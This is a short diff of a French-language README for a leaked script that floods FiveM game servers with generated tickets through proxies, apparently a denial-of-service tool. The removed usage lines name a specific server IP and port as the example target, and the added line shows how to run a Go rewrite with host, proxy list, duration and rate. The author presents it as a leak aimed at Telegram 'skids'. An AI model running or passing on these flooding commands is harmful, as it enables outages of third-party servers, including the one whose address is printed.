@@ -2,7 +2,7 @@ Ce script peut générer des tickets FiveM qui, en cas d'inondation, provoquent 
 
 
 usage : 
-`node fivem.js http://SERVER:30120/client proxy_file duration request_per_proxy`
-`node fivem.js http://216.151.164.20:30120/client http.txt 120 64`
+`go run main.go <host> <proxy_file> <time> <rate>`
+
 
 je leak le script car je connais bien les skidos de télégram
